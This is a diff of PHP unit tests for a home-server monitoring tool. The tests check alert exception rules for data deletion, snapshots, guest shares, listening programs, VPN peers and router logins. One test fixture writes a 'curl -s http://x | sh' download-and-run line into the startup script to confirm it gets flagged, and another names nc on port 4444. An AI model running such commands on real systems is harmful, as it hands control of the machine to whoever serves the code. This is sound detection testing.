+    $pass = function (array $book, array $rules): array {
+        $b = [];
+        $st = [];
+        watchmanRulesApply($book, [], $b, [], ['rules' => $rules, 'off' => [], 'known' => []], [], $st, 2000000000);
+        return array_map(fn ($x) => [watchmanOpen($x), $x['by'] ?? null], array_values(array_filter($book, fn ($x) => str_starts_with((string) $x['key'], 'flow_gone:'))));
+    };
+    $let = $rule(['flow_gone'], ['share' => 'Serien']);
+    same('6b pass: «don\'t judge deletions in Serien» — 300 GB noted by the rule; 70 % still open', [[[false, 'rule']], [[true, null]]],
+        [$pass($run($lost, [])[2], [$let]), $pass($run($half, [])[2], [$let])]);
+    same('6b pass: a threshold never lets anything through in the pass', [[true, null]], $pass($run($lost, [])[2], [$rule(['flow_gone'], ['share' => 'Serien'], ['min' => 1])]));
+
+    // files: 21 000 deleted in Fotos while learning (clear 20 000) — a threshold of 30 000; 250 000 always told
+    $files = function (int $x, array $judge) use ($look, $zfs, $ds, $gb, $t0): array {
+        $bf = null;
+        $book = [];
+        [, $flow, $cnt] = watchmanFlowCompare($bf, [], null, $look(['zfs' => $zfs(['tank/Fotos' => $ds(900 * $gb, 0, 100)])]), $book, $t0);
+        watchmanFlowCompare($bf, $flow, $cnt, $look(['zfs' => $zfs(['tank/Fotos' => $ds(900 * $gb, 0, 100 + $x)])]), $book, $t0 + 300, $judge);
+        $open = array_column(array_filter($book, 'watchmanOpen'), null, 'key');
+        return [$open['flow_gone:files:share:Fotos']['p']['files'] ?? null, !empty($open['flow_gone:files:share:Fotos']['p']['_must']), $judge['hits'] ?? []];
+    };
+    $f30 = $rule(['flow_gone'], ['share' => 'Fotos'], ['files' => 30000]);
+    same('6b files: 21 000 told; with «Fotos: from 30 000 files» nothing (a hit); 250 000 always told',
+        [[21000, false, []], [null, false, 1], [250000, true, []]],
+        [$files(21000, []), (fn ($r) => [$r[0], $r[1], $r[2][$f30['id']]['n'] ?? 0])($files(21000, ['rules' => [$f30]])),
+         $files(250000, ['rules' => [$rule(['flow_gone'], ['share' => 'Fotos'], ['files' => 900000])]])]);
+    same('6b files: from 3000 an hour (his setting) while learned — the clear while learning stays 20 000', [null], [$files(15000, $set(['files_min' => 3000]))[0]]);
+
+    // written: new image layers left out of a share by its threshold
+    $wr = function (array $judge) use ($look, $gb, $t0): array {
+        $z = fn (array $sets) => ['datasets' => ['tank' => ['w' => 0, 'u' => 1, 's' => null, 'c' => 1]] + $sets, 'pools' => ['tank'], 'asleep' => []];
+        $bf = null;
+        $book = [];
+        $base = ['tank/system' => ['w' => 10 * $gb, 'u' => 20 * $gb, 's' => null, 'c' => 1]];
+        [, $flow, $cnt] = watchmanFlowCompare($bf, [], null, $look(['zfs' => $z($base)]), $book, $t0);
+        $layer = ['tank/system/' . str_repeat('a', 64) => ['w' => 15 * $gb, 'u' => 15 * $gb, 's' => null, 'c' => $t0 + 100]];
+        watchmanFlowCompare($bf, $flow, $cnt, $look(['zfs' => $z($base + $layer)]), $book, $t0 + 300, $judge);
+        $open = array_column(array_filter($book, 'watchmanOpen'), null, 'key');
+        return [$open['flow_written:tank/system']['p']['bytes'] ?? null, $judge['hits'] ?? []];
+    };
+    $ly = $rule(['flow_written'], ['share' => 'system'], ['layers' => false]);
+    same('6b written: 15 GB of a new Docker layer into system told (as up to 1.95); with «new Docker images don\'t count» nothing, a hit',
+        [15 * $gb, null, 1], [$wr([])[0], $wr(['rules' => [$ly]])[0], $wr(['rules' => [$ly]])[1][$ly['id']]['n'] ?? 0]);
+
+    // a client: 60 GB in a round while learning (clear 50 GB); his setting 100 GB; a threshold for it
+    $cl = function (array $judge) use ($look, $gb, $t0): ?array {
+        $conn = fn (int $sent) => ['local' => '192.0.2.20', 'lport' => 445, 'peer' => '192.0.2.7', 'pport' => 50000, 'service' => 'smb', 'sent' => $sent, 'rcvd' => 0];
+        $bf = null;
+        $book = [];
+        [, $flow, $cnt] = watchmanFlowCompare($bf, [], null, $look(['conns' => [$conn(1000)]]), $book, $t0);
+        watchmanFlowCompare($bf, $flow, $cnt, $look(['conns' => [$conn(1000 + 60 * $gb)]]), $book, $t0 + 300, $judge);
+        return array_column(array_filter($book, 'watchmanOpen'), null, 'key')['flow_client:192.0.2.7|smb']['p'] ?? null;
+    };
+    same('6b pull: 60 GB told; «while learning 100 GB» nothing; «192.0.2.7: from 80 GB» nothing; a threshold for another computer — told',
+        [60 * $gb, null, null, 60 * $gb],
+        [$cl([])['bytes'] ?? null, $cl(['set' => watchmanSettings(['set' => ['pull' => ['new' => 100]]])]),
+         $cl(['rules' => [['id' => 'r0000000c1', 'cat' => 'pull', 'kinds' => ['flow_client'], 'on' => ['ip' => '192.0.2.7'], 'at' => 1, 'opt' => ['min' => 80 * $gb]]]]),
+         $cl(['rules' => [['id' => 'r0000000c2', 'cat' => 'pull', 'kinds' => ['flow_client'], 'on' => ['ip' => '192.0.2.8'], 'at' => 1, 'opt' => ['min' => 80 * $gb]]]])['bytes'] ?? null]);
+
+    // by hand
+    $made = fn (string $cat, string $type, string $v, int $n = 0) => (fn ($m) => [$m['kinds'], $m['on'], $m['opt'] ?? null])(watchmanRuleHandMake($cat, $type, $v, '', $n));
+    same('6b hand: a computer, from an amount; a container; a share\'s deletions, its writing, amounts, its snapshots, new images; a disk',
+        [[['flow_client'], ['ip' => '192.168.1.20'], null], [['flow_client'], ['ip' => '192.168.1.20'], ['min' => 30 * $gb]], [['flow_container'], ['key' => 'flow_container:plex'], null],
+         [['flow_gone'], ['share' => 'Downloads'], null], [['flow_written'], ['share' => 'domains'], null], [['flow_gone'], ['share' => 'Media'], ['min' => 200 * $gb]],
+         [['flow_gone'], ['share' => 'Media'], ['files' => 5000]], [['flow_gone'], ['share' => 'Media'], ['kept' => false]], [['flow_written'], ['share' => 'system'], ['layers' => false]],
+         [['flow_gone'], ['disk' => 'disk3'], null]],
+        [$made('pull', 'client', '192.168.1.20'), $made('pull', 'client_min', '192.168.1.20', 30), $made('pull', 'container', 'plex'), $made('data', 'gone', 'Downloads'),
+         $made('data', 'written', 'domains'), $made('data', 'gone_min', 'Media', 200), $made('data', 'files_min', 'Media', 5000), $made('data', 'kept', 'Media'),
+         $made('data', 'layers', 'system'), $made('data', 'disk_gone', 'disk3')]);
+    same('6b hand: an amount missing, a disk not a disk\'s name, a share with a slash — refused; the data\'s without a second yes (1.96)',
+        ['watch_amount_bad', 'watch_value_bad', 'watch_value_bad', 'watch_gone'],
+        [$err(fn () => watchmanRuleHandMake('data', 'gone_min', 'Media', '', 0)), $err(fn () => watchmanRuleHandMake('data', 'disk_gone', 'Disk 1', '')),
+         $err(fn () => watchmanRuleHandMake('data', 'gone', 'a/b', '')), $err(fn () => watchmanRuleHand('data', 'gone', 'Downloads', '', false, sys_get_temp_dir() . '/none', 1, false))]);
+}
+
+/**
+ * 1.96 step 6c — snapshots and offsite: the offsite setting (default = half, as before), a series thinned on a dataset or
+ * everywhere (never its last one), a dataset whose snapshots may go altogether (never a whole pool), a dataset whose holds
+ * may be released — each covers, each doesn't.
+ */
+function testWatchmanRules6c(): void
+{
+    $err = fn (callable $f) => (function () use ($f) { try { $f(); return null; } catch (Problem $p) { return $p->key; } })();
+    same('6c offsite: by default less than half left (as up to 1.95); 25 % and 75 % set', [true, false, false, true, true, false],
+        [watchmanKopiaEmptied(100, 49), watchmanKopiaEmptied(100, 50), watchmanKopiaEmptied(100, 30, 25), watchmanKopiaEmptied(100, 24, 25),
+         watchmanKopiaEmptied(100, 70, 75), watchmanKopiaEmptied(100, 75, 75)]);
+    same('6c offsite: the setting\'s default is half', 50, WATCH_SETTINGS['snap']['offsite']['def']);
+    $x = fn (string $ds, string $name, bool $left) => ['name' => $name, 'ds' => $ds, 'series' => watchmanSnapSeries($name), 'left' => $left, 'held' => false];
+    $r = fn (string $id, array $kinds, array $on) => ['id' => $id, 'cat' => 'snap', 'kinds' => $kinds, 'on' => $on, 'at' => 1];
+    $names = fn (array $list) => array_map(fn ($y) => $y['ds'] . '@' . $y['name'], $list);
+    $list = [$x('tank/Media', 'auto-20261101', true), $x('tank/Media', 'auto-20261102', false), $x('tank/Docs', 'auto-20261101', true), $x('tank/Docs', 'manual-1', true),
+             $x('tank/Media/sub', 'auto-20261101', true)];
+    $hits = [];
+    same('6c series everywhere: every thinned one of auto-# — never the last one (Media\'s newest), never another series',
+        ['tank/Media@auto-20261102', 'tank/Docs@manual-1'], $names(watchmanSnapRuled($list, 'snap_gone', [$r('r0000000s1', ['snap_gone'], ['series' => 'auto-#'])], $hits, 9)));
+    same('6c … its hits: one per snapshot it took', 3, $hits['r0000000s1']['n'] ?? 0);
+    same('6c series on a dataset: only on tank/Media (not Docs, not Media\'s child), not its last',
+        ['tank/Media@auto-20261102', 'tank/Docs@auto-20261101', 'tank/Docs@manual-1', 'tank/Media/sub@auto-20261101'],
+        $names(watchmanSnapRuled($list, 'snap_gone', [$r('r0000000s2', ['snap_gone'], ['series' => 'auto-#', 'dataset' => 'tank/Media'])], $hits, 9)));
+    same('6c dataset: on tank/Media everything may go — its last one too; not its child, not Docs',
+        ['tank/Docs@auto-20261101', 'tank/Docs@manual-1', 'tank/Media/sub@auto-20261101'],
+        $names(watchmanSnapRuled($list, 'snap_gone', [$r('r0000000s3', ['snap_gone'], ['dataset' => 'tank/Media'])], $hits, 9)));
+    same('6c hold: a hold on tank/Media may be released — never a snapshot gone; and the gone rule never a hold',
+        [5, ['tank/Docs@auto-20261101', 'tank/Docs@manual-1', 'tank/Media/sub@auto-20261101'], 5],
+        [count(watchmanSnapRuled($list, 'snap_gone', [$r('r0000000s4', ['snap_hold_released'], ['dataset' => 'tank/Media'])], $hits, 9)),
+         $names(watchmanSnapRuled($list, 'snap_hold_released', [$r('r0000000s4', ['snap_hold_released'], ['dataset' => 'tank/Media'])], $hits, 9)),
+         count(watchmanSnapRuled($list, 'snap_hold_released', [$r('r0000000s3', ['snap_gone'], ['dataset' => 'tank/Media'])], $hits, 9))]);
+    same('6c shapes: never a whole pool, a dataset below one', [null, null, ['dataset' => 'tank/Media'], ['series' => 'auto-#', 'dataset' => 'tank/Media']],
+        [watchmanRuleOn(['dataset' => 'tank']), watchmanRuleOn(['dataset' => 'tank/']), watchmanRuleOn(['dataset' => 'tank/Media']),
+         watchmanRuleOn(['series' => 'auto-#', 'dataset' => 'tank/Media'])]);
+    // in the compare: what the rules take out never makes an entry; what is left does
+    $bs = ['series' => []];
+    $book = [];
+    $h = [];
+    $res = ['gone' => [['fs' => 'zfs', 'where' => 'tank', 'list' => $list]], 'released' => [['fs' => 'zfs', 'where' => 'tank', 'list' => [$x('tank/Media', 'auto-20261101', true)]]]];
+    watchmanSnapCompare($bs, $res, $book, 9, [$r('r0000000s3', ['snap_gone'], ['dataset' => 'tank/Media']), $r('r0000000s4', ['snap_hold_released'], ['dataset' => 'tank/Media'])], $h);
+    same('6c compare: Media\'s two gone, its released hold — not in his book; Docs\' and the child\'s counted', [['snap_gone'], [3], [2, 1]],
+        [array_column($book, 'kind'), array_column($book, 'count'), [$h['r0000000s3']['n'] ?? 0, $h['r0000000s4']['n'] ?? 0]]);
+    // offers
+    $e = fn (string $kind, array $p) => watchmanEntry($kind, "$kind:zfs:tank", 1, ['where' => 'tank', 'fs' => 'zfs'] + $p);
+    same('6c offers: one series on one dataset — on it, or everywhere; two series — none; never the pool\'s key; a hold on one dataset',
+        [['series_ds', 'series'], ['series'], [], ['hold'], []],
+        [array_column(watchmanRuleOffers($e('snap_gone', ['series' => ['auto-#'], 'datasets' => ['tank/Media']]), []), 'type'),
+         array_column(watchmanRuleOffers($e('snap_gone', ['series' => ['auto-#'], 'datasets' => ['tank/Media', 'tank/Docs']]), []), 'type'),
+         array_column(watchmanRuleOffers($e('snap_gone', ['series' => ['auto-#', 'manual-#'], 'datasets' => ['tank/Media']]), []), 'type'),
+         array_column(watchmanRuleOffers($e('snap_hold_released', ['datasets' => ['tank/Media']]), []), 'type'),
+         array_column(watchmanRuleOffers($e('snap_hold_released', ['datasets' => ['tank']]), []), 'type')]);
+    same('6c offers: asked more clearly (snap_gone, snap_hold_released are on the list)', [true, true],
+        [watchmanRuleOffers($e('snap_gone', ['series' => ['auto-#'], 'datasets' => ['tank/Media']]), [])[0]['ask'], watchmanRuleOffers($e('snap_hold_released', ['datasets' => ['tank/Media']]), [])[0]['ask']]);
+    // by hand
+    $made = fn (string $type, string $v, string $second = '') => (fn ($m) => [$m['kinds'], $m['on'], $m['wide']])(watchmanRuleHandMake('snap', $type, $v, $second));
+    same('6c hand: a series, a series on a dataset, a dataset, a hold — each asked clearly',
+        [[['snap_gone'], ['series' => 'auto-#'], true], [['snap_gone'], ['series' => 'auto-#', 'dataset' => 'tank/Media'], true], [['snap_gone'], ['dataset' => 'tank/Media'], true],
+         [['snap_hold_released'], ['dataset' => 'tank/Media'], true]],
+        [$made('series', 'auto-#'), $made('series_ds', 'tank/Media', 'auto-#'), $made('dataset', 'tank/Media'), $made('hold', 'tank/Media')]);
+    same('6c hand: a whole pool refused, a snapshot name for a dataset refused, a series missing refused',
+        ['watch_pool_whole', 'watch_pool_whole', 'watch_value_bad', 'watch_value_bad'],
+        [$err(fn () => watchmanRuleHandMake('snap', 'dataset', 'tank', '')), $err(fn () => watchmanRuleHandMake('snap', 'hold', 'tank', '')),
+         $err(fn () => watchmanRuleHandMake('snap', 'dataset', 'tank/Media@x', '')), $err(fn () => watchmanRuleHandMake('snap', 'series_ds', 'tank/Media', ''))]);
+}
+
+/**
+ * 1.96 step 6d — flash and accounts, open shares, the server itself, ways in: go's blanks and comments, guests reading,
+ * the exceptions (a file in /boot/extra, a share open to guests, a port, a program on any port, a tunnel's new peers) —
+ * each covers, each doesn't — the clearer question for --privileged, the Docker socket, memory, the flash; and the posture
+ * tips «public» and «privileged» leaving out what your exceptions call intended (none: as before, your note still holds).
+ */
+function testWatchmanRules6d(): void
+{
+    $err = fn (callable $f) => (function () use ($f) { try { $f(); return null; } catch (Problem $p) { return $p->key; } })();
+    same('6d settings: off by default (as up to 1.95)', [false, false], [WATCH_SETTINGS['flash']['go_blank']['def'], WATCH_SETTINGS['share']['secure_ok']['def']]);
+    $tmp = hardeningTmp('watch-6d');
+    $go = fn (string $text) => (file_put_contents("$tmp/go", $text) !== false ? watchmanFlash(['go' => "$tmp/go", 'extra' => "$tmp/none", 'passwd' => "$tmp/none",
+        'shadow' => "$tmp/none", 'ssh' => "$tmp/none"])['go'] : null);
+    $base = $go("#!/bin/bash\n# Start the Management Utility\n/usr/local/sbin/emhttp &\n");
+    $cmp = function (array $kg, array $sg, bool $ok) {
+        $known = ['go' => $kg, 'extra' => [], 'users' => [], 'pw' => [], 'keys' => []];
+        $book = [];
+        watchmanFlashCompare($known, ['go' => $sg, 'extra' => [], 'users' => [], 'pw' => [], 'keys' => []], $book, 1, null, $ok);
+        return [array_column($book, 'kind'), $known['go']['hash'] === $sg['hash']];
+    };
+    $blank = $go("#!/bin/bash\n# Start the Management Utility (Unraid)\n\n/usr/local/sbin/emhttp &   \n");
+    $cmd = $go("#!/bin/bash\n# Start the Management Utility\n/usr/local/sbin/emhttp &\ncurl -s http://x | sh\n");
+    same('6d go: a comment and blanks only — told by default; with the setting normal; a command added — told; a baseline from before (no cmds) — told',
+        [[['flash_go'], false], [[], true], [['flash_go'], false], [['flash_go'], false]],
+        [$cmp($base, $blank, false), $cmp($base, $blank, true), $cmp($base, $cmd, true), $cmp(array_diff_key($base, ['cmds' => 1]), $blank, true)]);
+    hardeningRm($tmp);
+    $shares = function (array $seen, bool $ok) {
+        $known = ['Media' => ['smb' => 0, 'nfs' => 0, 'seen' => 1], 'flash' => ['smb' => 0, 'nfs' => 0, 'seen' => 1]];
+        $book = [];
+        watchmanSharesCompare($known, $seen, $book, 2, $ok);
+        return array_column($book, 'key');
+    };
+    same('6d shares: guests reading — told by default, normal with the setting; public — told; the flash for guests — always; a new share reading — normal',
+        [['share_public:Media:smb'], [], ['share_public:Media:smb'], ['share_public:flash:smb'], []],
+        [$shares(['Media' => ['smb' => 1, 'nfs' => 0]], false), $shares(['Media' => ['smb' => 1, 'nfs' => 0]], true), $shares(['Media' => ['smb' => 2, 'nfs' => 0]], true),
+         $shares(['flash' => ['smb' => 1, 'nfs' => 0]], true), $shares(['Docs' => ['smb' => 1, 'nfs' => 0]], true)]);
+    $e = fn (string $kind, string $key, array $p) => watchmanEntry($kind, $key, 1, $p);
+    $cov = fn (array $kinds, array $on, array $x) => watchmanRuleCovers(['kinds' => $kinds, 'on' => $on], $x);
+    $sh = fn (string $share, string $proto, string $level) => $e('share_public', "share_public:$share:$proto", ['share' => $share, 'proto' => $proto, 'level' => $level]);
+    same('6d share open: reading covers reading only; writing covers both; another protocol or share no',
+        [true, false, true, true, false, false],
+        [$cov(['share_public'], ['share' => 'Media', 'proto' => 'smb', 'open' => 'read'], $sh('Media', 'smb', 'secure')),
+         $cov(['share_public'], ['share' => 'Media', 'proto' => 'smb', 'open' => 'read'], $sh('Media', 'smb', 'public')),
+         $cov(['share_public'], ['share' => 'Media', 'proto' => 'smb', 'open' => 'write'], $sh('Media', 'smb', 'secure')),
+         $cov(['share_public'], ['share' => 'Media', 'proto' => 'smb', 'open' => 'write'], $sh('Media', 'smb', 'public')),
+         $cov(['share_public'], ['share' => 'Media', 'proto' => 'smb', 'open' => 'write'], $sh('Media', 'nfs', 'public')),
+         $cov(['share_public'], ['share' => 'Media', 'proto' => 'smb', 'open' => 'write'], $sh('Docs', 'smb', 'public'))]);
+    $ln = fn (string $prog, ?int $port) => $e('listen_new', 'listen_new:' . ($port === null ? "$prog:*" : "tcp:$port"), ['prog' => $prog, 'port' => $port, 'key' => $port === null ? "$prog:*" : "tcp:$port"]);
+    $wg = fn (?bool $opened, int $new) => $e('door_new', 'door_new:wg:wg0', ['key' => 'wg:wg0', 'door' => 'wireguard', 'new_peers' => $new] + ($opened === null ? [] : ['_opened' => $opened]));
+    same('6d prog: syncthing on any port yes, another program no; tunnel: new peers of wg0 yes — switched on, an entry from before 1.96, wg1 no',
+        [true, true, false, true, false, false, false],
+        [$cov(['listen_new'], ['prog' => 'syncthing'], $ln('syncthing', 8384)), $cov(['listen_new'], ['prog' => 'syncthing'], $ln('syncthing', null)),
+         $cov(['listen_new'], ['prog' => 'syncthing'], $ln('nc', 4444)),
+         $cov(['door_new'], ['tunnel' => 'wg0'], $wg(false, 2)), $cov(['door_new'], ['tunnel' => 'wg0'], $wg(true, 2)), $cov(['door_new'], ['tunnel' => 'wg0'], $wg(null, 2)),
+         $cov(['door_new'], ['tunnel' => 'wg1'], $wg(false, 2))]);
+    $offers = fn (array $x) => array_map(fn ($o) => [$o['type'], $o['ask']], watchmanRuleOffers($x, [$x]));
+    same('6d offers: a share open as it is now; the flash only its key, asked clearly; a program on any port; a tunnel\'s new peers',
+        [[['open', false]], [['key', true]], [['prog', false], ['key', false]], [['tunnel', true], ['key', true]], [['key', true]]],
+        [$offers($sh('Media', 'smb', 'public')), $offers($sh('flash', 'smb', 'secure')), $offers($ln('syncthing', 8384)), $offers($wg(false, 1)), $offers($wg(true, 1))]);
+    same('6d open offer: as the share is now — reading for ⟦Secure⟧, writing for ⟦Public⟧', ['read', 'write'],
+        [watchmanRuleOffers($sh('Media', 'smb', 'secure'), [])[0]['on']['open'], watchmanRuleOffers($sh('Media', 'smb', 'public'), [])[0]['on']['open']]);
+    same('6d asked clearly: --privileged, the Docker socket, the server\'s root, a program from memory on the server; not a device, not a container\'s /tmp',
+        [true, true, true, true, false, false],
+        [watchmanRuleOffers($e('container_privileged', 'container_privileged:x', ['name' => 'x', 'tokens' => ['--privileged']]), [])[0]['ask'],
+         watchmanRuleOffers($e('container_rights', 'container_rights:x', ['name' => 'x', 'tokens' => ['-v /var/run/docker.sock']]), [])[0]['ask'],
+         watchmanRuleOffers($e('container_rights', 'container_rights:x', ['name' => 'x', 'tokens' => ['-v /']]), [])[0]['ask'],
+         watchmanRuleOffers($e('proc_odd', 'proc_odd:host:/memfd:x', ['where' => 'host']), [])[0]['ask'],
+         watchmanRuleOffers($e('container_rights', 'container_rights:x', ['name' => 'x', 'tokens' => ['--device=/dev/dri']]), [])[0]['ask'],
+         watchmanRuleOffers($e('proc_odd', 'proc_odd:ct:x:/tmp/y', ['where' => 'x']), [])[0]['ask']]);
+
+    // the posture tips: what your exceptions call intended
+    $seen = ['shares' => ['Media' => ['smb' => 2, 'nfs' => 0], 'Docs' => ['smb' => 2, 'nfs' => 0]],
+             'containers' => ['vpn' => ['tokens' => ['--privileged'], 'start' => 'run'], 'dri' => ['tokens' => ['--privileged'], 'start' => 'auto']]];
+    $tips = fn (array $intended) => array_column(watchmanPosture([], $seen, [], $intended), null, 'id');
+    $none = $tips([]);
+    $some = $tips(watchmanPostureIntended([['kinds' => ['share_public'], 'on' => ['share' => 'Media', 'proto' => 'smb', 'open' => 'write']],
+                                           ['kinds' => ['container_privileged'], 'on' => ['key' => 'container_privileged:vpn']],
+                                           ['kinds' => ['share_public'], 'on' => ['share' => 'Docs', 'proto' => 'smb', 'open' => 'read']]]));
+    same('6d posture: nothing intended — exactly as up to 1.95 (the signature your note holds)', [watchmanHash('public|Media:SMB,Docs:SMB'), watchmanHash('privileged|vpn,dri')],
+        [$none['public']['sig'] ?? null, $none['privileged']['sig'] ?? null]);
+    same('6d posture: Media (writing) and vpn intended — the tips name the rest and call those intended; reading alone doesn\'t make ⟦Public⟧ intended',
+        ['Docs (SMB)', 'Media (SMB)', watchmanHash('public|Docs:SMB'), 'dri', 'vpn'],
+        [$some['public']['p']['names'] ?? null, $some['public']['p']['intended'] ?? null, $some['public']['sig'] ?? null, $some['privileged']['p']['names'] ?? null,
+         $some['privileged']['p']['intended'] ?? null]);
+    same('6d posture: all of them intended — no tip', [false, false],
+        (fn ($t) => [isset($t['public']), isset($t['privileged'])])($tips(['public' => ['Media:SMB' => true, 'Docs:SMB' => true], 'privileged' => ['vpn' => true, 'dri' => true]])));
+
+    // by hand
+    $made = fn (string $cat, string $type, string $v, string $second = '') => (fn ($m) => [$m['kinds'], $m['on'], $m['wide']])(watchmanRuleHandMake($cat, $type, $v, $second));
+    same('6d hand: a file in /boot/extra, a share guests may read (SMB) or write (NFS, asked), a port, a program, a tunnel',
+        [[['flash_extra'], ['key' => 'flash_extra:x.txz'], false], [['share_public'], ['share' => 'Media', 'proto' => 'smb', 'open' => 'read'], false],
+         [['share_public'], ['share' => 'Media', 'proto' => 'nfs', 'open' => 'write'], true], [['listen_new'], ['key' => 'listen_new:tcp:8384'], false],
+         [['listen_new'], ['prog' => 'syncthing'], false], [['door_new'], ['tunnel' => 'wg0'], false]],
+        [$made('flash', 'extra', 'x.txz'), $made('share', 'guest_read', 'Media'), $made('share', 'guest_write', 'Media', 'NFS'), $made('host', 'port', '8384'),
+         $made('host', 'prog', 'syncthing'), $made('door', 'tunnel', 'wg0')]);
+    same('6d hand: the flash for guests, a port out of range, a protocol not SMB or NFS — refused', ['watch_value_bad', 'watch_value_bad', 'watch_value_bad'],
+        [$err(fn () => watchmanRuleHandMake('share', 'guest_read', 'flash', '')), $err(fn () => watchmanRuleHandMake('host', 'port', '70000', '')),
+         $err(fn () => watchmanRuleHandMake('share', 'guest_read', 'Media', 'AFP'))]);
+}
+
+/**
+ * 1.96 step 6e — the partner door, the router, the network: settings (defaults = the constants), a partner from another
+ * address or net, an admin from a net, a VPN user from anywhere, a router's port, a sender not judged, a network whose new
+ * devices need no line, made-up Wi-Fi addresses — each covers, each doesn't; offers name only addresses the entry shows.
+ */
+function testWatchmanRules6e(): void
+{
+    $err = fn (callable $f) => (function () use ($f) { try { $f(); return null; } catch (Problem $p) { return $p->key; } })();
+    $set = watchmanSettings([]);
+    same('6e settings: the defaults are the constants he judged by', [WATCH_REFUSED_BURST, WATCH_REFUSED_WINDOW, WATCHNET_SILENT_FLOOR, WATCHNET_FLAPS,
+        WATCHNET_OUTAGE_SHORT, WATCHNET_OUTAGE_TELL, WATCHNET_CLOCK, false],
+        [$set['partner']['burst'], $set['partner']['window'], $set['router']['silent'] * 3600, $set['router']['flaps'], $set['router']['outage_short'] * 60,
+         $set['router']['outage_tell'] * 60, $set['router']['clock'] * 60, $set['lan']['random']]);
+    same('6e watchnet: his defaults hand watchnet exactly what it judged by', array_diff_key(watchnetSet([]), ['nets' => 1]), array_diff_key(watchmanNetSet($set, []), ['nets' => 1]));
+    $ns = ['senders' => ['192.168.1.1' => ['skew' => 400, 'meta' => ['host' => 'gw']]]];
+    $at = [watchnetClock($ns) !== null];
+    watchnetSet(watchmanNetSet(watchmanSettings(['set' => ['router' => ['clock' => 10]]]), []));
+    $at[] = watchnetClock($ns) !== null;
+    watchnetSet([]);
+    same('6e clock: 400 s off — advice by default, none with 10 min set', [true, false], $at);
+
+    $e = fn (string $kind, string $key, array $p) => watchmanEntry($kind, $key, 1, $p);
+    $cov = fn (array $kinds, array $on, array $x) => watchmanRuleCovers(['kinds' => $kinds, 'on' => $on], $x);
+    $moved = fn (string $id, string $ip, string $how) => $e('door_key_moved', "door_key_moved:$id:$ip", ['id' => $id, 'name' => 'Tom', 'ip' => $ip, 'how' => $how]);
+    same('6e partner: its key from 192.168.7.9 yes, from the net yes; another key from there, another partner, another address no',
+        [true, true, false, false, false],
+        [$cov(['door_key_moved'], ['pair' => 'abcd1234', 'ip' => '192.168.7.9'], $moved('abcd1234', '192.168.7.9', 'address')),
+         $cov(['door_key_moved'], ['pair' => 'abcd1234', 'net' => '192.168.7.0/24'], $moved('abcd1234', '192.168.7.9', 'address')),
+         $cov(['door_key_moved'], ['pair' => 'abcd1234', 'ip' => '192.168.7.9'], $moved('abcd1234', '192.168.7.9', 'key')),
+         $cov(['door_key_moved'], ['pair' => 'abcd1234', 'ip' => '192.168.7.9'], $moved('ffff0000', '192.168.7.9', 'address')),
+         $cov(['door_key_moved'], ['pair' => 'abcd1234', 'ip' => '192.168.7.9'], $moved('abcd1234', '192.168.7.10', 'address'))]);
+    $adm = fn (string $admin, string $ip) => $e('net_router_login', "net_router_login:gw:$admin:$ip", ['sender' => '192.168.1.1', 'admin' => $admin, 'ip' => $ip]);
+    $vpn = fn (string $user) => $e('net_vpn_login', "net_vpn_login:gw:$user:203.0.113.9", ['sender' => '192.168.1.1', 'user' => $user, 'ip' => '203.0.113.9']);
+    $down = fn (string $sender, string $iface) => $e('net_link_down', "net_link_down:$sender:$iface:2026-11-20", ['sender' => $sender, 'iface' => $iface]);
+    same('6e router: an admin from his net yes — another admin, outside no; a VPN user from anywhere yes, another no; a port yes, another no',
+        [true, false, false, true, false, true, false],
+        [$cov(['net_router_login'], ['admin' => 'benj', 'net' => '192.168.1.0/24'], $adm('benj', '192.168.1.20')),
+         $cov(['net_router_login'], ['admin' => 'benj', 'net' => '192.168.1.0/24'], $adm('eve', '192.168.1.20')),
+         $cov(['net_router_login'], ['admin' => 'benj', 'net' => '192.168.1.0/24'], $adm('benj', '192.168.2.20')),
+         $cov(['net_vpn_login'], ['vpn' => 'phone'], $vpn('phone')), $cov(['net_vpn_login'], ['vpn' => 'phone'], $vpn('other')),
+         $cov(['net_link_down'], ['sender' => '192.168.1.1', 'iface' => 'ether5'], $down('192.168.1.1', 'ether5')),
+         $cov(['net_link_down'], ['sender' => '192.168.1.1', 'iface' => 'ether5'], $down('192.168.1.1', 'ether1'))]);
+    same('6e sender: every router kind of 192.168.1.1 yes; another sender no; the logins\' net shape as before',
+        [true, true, false, true],
+        [$cov(WATCH_RULE_ROUTER, ['sender' => '192.168.1.1'], $adm('eve', '203.0.113.7')), $cov(WATCH_RULE_ROUTER, ['sender' => '192.168.1.1'], $down('192.168.1.1', 'ether1')),
+         $cov(WATCH_RULE_ROUTER, ['sender' => '192.168.1.1'], $down('192.168.1.2', 'ether1')),
+         $cov(['login_new_ip'], ['net' => '192.168.1.0/24'], $e('login_new_ip', 'login_new_ip:192.168.1.5', ['ip' => '192.168.1.5']))]);
+
+    // offers: only addresses the entry itself names (the privacy rule)
+    $offers = fn (array $x) => watchmanRuleOffers($x, [$x]);
+    $ips = function (array $offers): array {
+        $out = [];
+        foreach ($offers as $o) {
+            foreach (['ip', 'net'] as $k) {
+                if (isset($o['on'][$k])) {
+                    $out[] = $o['on'][$k];
+                }
+            }
+        }
+        return $out;
+    };
+    same('6e offers: a partner from a private address — it, its /24; from a public one — only it; another key — only its own key',
+        [['pair_ip', 'pair_net', 'key'], ['pair_ip', 'key'], ['key'], ['192.168.7.9', '192.168.7.0/24'], 'Tom'],
+        [array_column($offers($moved('abcd1234', '192.168.7.9', 'address')), 'type'), array_column($offers($moved('abcd1234', '203.0.113.5', 'address')), 'type'),
+         array_column($offers($moved('abcd1234', '192.168.7.9', 'key')), 'type'), $ips($offers($moved('abcd1234', '192.168.7.9', 'address'))),
+         $offers($moved('abcd1234', '192.168.7.9', 'address'))[0]['what'] ?? null]);
+    same('6e offers: an admin (its address, its /24, the key, the whole sender — asked); a VPN user; a port; a new device only its network',
+        [['admin_ip', 'admin_net', 'key', 'sender'], true, ['vpn', 'key', 'sender'], ['link', 'sender'], ['network'], ['key']],
+        [array_column($offers($adm('benj', '192.168.1.20')), 'type'), $offers($adm('benj', '192.168.1.20'))[3]['ask'], array_column($offers($vpn('phone')), 'type'),
+         array_column($offers($down('192.168.1.1', 'ether5')), 'type'),
+         array_column($offers($e('net_new_device', 'net_new_device:aa:bb', ['mac' => 'aa:bb', 'ip' => '192.168.9.5', 'network' => 'Gäste'])), 'type'),
+         array_column($offers($e('net_blocked_from_server', 'net_blocked_from_server:198.51.100.0/24 tcp/25', ['dst' => '…'])), 'type')]);
+
+    // a new device: a made-up Wi-Fi address with the setting, a network with your exception — learned, no line, the hit
